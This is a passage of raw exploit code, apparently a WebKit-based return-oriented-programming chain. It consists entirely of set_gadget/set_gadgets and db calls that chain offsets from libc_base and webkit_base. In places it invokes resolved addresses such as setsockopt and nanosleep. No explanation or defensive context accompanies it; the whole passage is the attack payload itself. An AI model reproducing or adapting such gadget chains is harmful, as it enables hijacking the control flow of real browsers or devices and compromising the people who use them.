set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+243520, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+243512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+243536, 
ropchain+243552, 
libc_base+811575, 
ropchain+243568, 
libc_base+811575, 
ropchain+243584, 
libc_base+811575, 
ropchain+240704, 
libc_base+793877, 
ropchain+243664, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+243648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+243760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243776, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+243888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243872, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+245216, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
nanosleep_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+246544, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+246616, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+246680, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+246832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+246848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+247000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+247032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+246984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+247016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247128, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+247112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+247336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+247352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+247320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+247440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+247584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+247600, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+247616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+785347, 
libc_base+793877, 
ropchain+247776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+247744, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+247760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+247960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+248048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+248104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+248200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+248328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+248496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+248528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+248480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+248624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+248608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+248944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+248960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+249080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+249064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+249224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+249360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+249344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+249496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+249656, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+249624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+249608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+249760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+249744, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+249856, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+249944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+250064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+250048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+250120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+250224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+250312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+250328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+250480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+250512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+250464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+250496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+250584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+250600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+250760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+250728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+250712, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+250864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+250848, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+250960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+251048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+251064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+251336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+251528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+251496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+251632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+251616, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+251728, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+251816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+251832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+252008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([2, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+252120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+252208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+252360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+252376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+252464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+252640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+252696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+252800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+252832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+252816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+252992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+252960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+253096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253080, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+792472,); 
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+253304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253320, 
